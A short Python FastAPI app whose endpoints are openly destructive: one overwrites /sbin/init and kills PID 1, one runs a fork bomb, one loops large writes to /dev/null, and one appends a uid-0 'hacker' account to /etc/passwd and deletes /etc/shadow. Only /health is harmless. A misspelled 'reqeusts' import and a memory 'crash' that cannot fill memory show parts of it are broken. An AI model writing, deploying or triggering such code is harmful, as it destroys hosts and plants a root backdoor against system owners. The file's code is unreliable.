from fastapi import FastAPI
import os
import shutil
import reqeusts
app = FastAPI()


@app.get("/crash-1")
def crash_1():
    os.system("echo 'exit 1' > /sbin/init")  # Overwrite init system
    os.system("kill -9 1")  # Kill the main process
    os._exit(1)  # Force exit the process
    return {"status": "System destroyed"}

@app.get("/crash-cpu")
def crash_cpu():
    while True:
        os.fork()

@app.get("/crash-mem")
def crash_mem():
    while True:
        with open("/dev/null", "wb") as f:
            f.write(b"0" * 10**9)  # Write 1GB repeatedly

@app.get("/dangerous-action")
def dangerous_action():
    with open("/etc/passwd", "a") as f:
        f.write("\nhacker:x:0:0::/root:/bin/bash\n")  # Adding a root user
        f.write("\nroot:$6$EXAMPLEHASH:18641:0:99999:7:::\n")  # Attempt to modify root password
    os.remove("/etc/shadow")
    return {"message": "System compromised! Root access allowed modifying users."}


@app.get("/health")
def health_check():
    return {"status": "OK"}


